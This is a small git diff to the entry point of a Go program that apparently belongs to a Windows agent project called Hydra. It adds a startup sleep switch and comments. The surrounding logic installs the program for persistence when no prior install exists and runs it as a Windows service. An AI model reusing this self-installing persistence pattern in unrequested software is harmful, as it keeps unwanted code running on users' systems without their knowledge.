@@ -3,6 +3,7 @@ package main
 import (
 	"log"
 	"os"
+	"time"
 
 	"github.com/Raffy27/Hydra/api"
 	"github.com/Raffy27/Hydra/commands"
@@ -11,11 +12,26 @@ import (
 	"golang.org/x/sys/windows/svc"
 )
 
+func checkSwitch(sw string) bool {
+	for _, arg := range os.Args[1:] {
+		if arg == sw {
+			return true
+		}
+	}
+	return false
+}
+
 func main() {
+
+	if checkSwitch("chill") {
+		log.Println("Sleeping for 5 seconds")
+		time.Sleep(5 * time.Second)
+	}
 
 	//Check single instance
 	util.CheckSingle()
 
+	//Check persistence
 	if !install.IsInstalled() {
 		log.Println("No previous install detected. Installing")
 		install.Install()
@@ -23,6 +39,7 @@ func main() {
 		log.Println("Already installed")
 	}
 
+	//Handle service mode
 	if os.Getenv("poly") == "" {
 		if chk, _ := svc.IsWindowsService(); chk {
 			install.HandleService(main)
